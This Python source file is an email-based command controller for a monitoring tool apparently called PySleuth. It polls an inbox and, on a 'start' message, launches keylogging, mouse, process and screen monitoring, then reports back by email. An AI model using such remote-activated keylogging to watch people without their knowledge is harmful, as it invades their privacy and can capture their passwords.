import os
import time

from .base import BaseController
from ..core.email import EmailSender, EmailReceiver, EmailClearer
from ..configuration import ConfigHandler


class EmailController(BaseController):
    def __init__(self, master):
        super(EmailController, self).__init__()

        self.master = master
        self.isActive = False
        self.__pause = 5

        self.sender, self.receiver, self.clearer = None, None, None

        self.initHandlers()
        self.connectSlots()

    def initHandlers(self):
        cfg = ConfigHandler().getCfgControl()

        self.__pause = cfg.getint("monitor-every")

        adminMail = cfg.get("admin-email")
        progMail = cfg.get("program-email")
        password = os.getenv('PYSLEUTH_EMAIL_PWD')

        assert adminMail is not None
        assert progMail is not None
        assert password is not None

        self.sender = EmailSender(progMail, adminMail, password)
        self.receiver = EmailReceiver(progMail, adminMail, password)
        self.clearer = EmailClearer(progMail, adminMail, password)

    def connectSlots(self):
        pass

    def startWorker(self):
        assert self.isActive
        self.clearer.clearInbox()

        self._sendMessage("PySleuth is awaiting startup signal")

        while True:
            cmd = self.receiver.readRecent()
            if cmd is None:
                continue

            self._processCommand(cmd)

            self.clearer.clearInbox()

            time.sleep(self.__pause)

    def login(self):
        self.sender.login()
        self.receiver.login()
        self.clearer.login()

        self.isActive = True
    
    def logout(self):
        self.sender.logout()
        self.receiver.logout()
        self.clearer.logout()

        self.isActive = False
    
    def __del__(self):
        if self.isActive:
            self.logout()

        assert not self.isActive
    
    def _sendMessage(self, message: str):
        self.sender.addHeaders()
        self.sender.attachPlainText(message)
        self.sender.send()

    def _processCommand(self, cmd: str):
        assert cmd is not None

        if cmd == "start":
            self._onStartProgram()
        elif cmd == "stop":
            self._onStopProgram()
    
    # --------------------------------------------------------------
    # Command processing
    # --------------------------------------------------------------
    
    def _onStartProgram(self):
        self.master.ctrls.keyloggerctrl.startWorker()
        self.master.ctrls.procMntrCtrl.startWorker()
        self.master.ctrls.mouseMntrCtrl.startWorker()
        self.master.ctrls.screenMntrCtrl.startWorker()

        self._sendMessage("PySleuth is up and running!")

        self.master.RUNNING = True
    
    def _onStopProgram(self):
        self._sendMessage("Shutdown command received")
        raise Exception("Shutdown command received ...")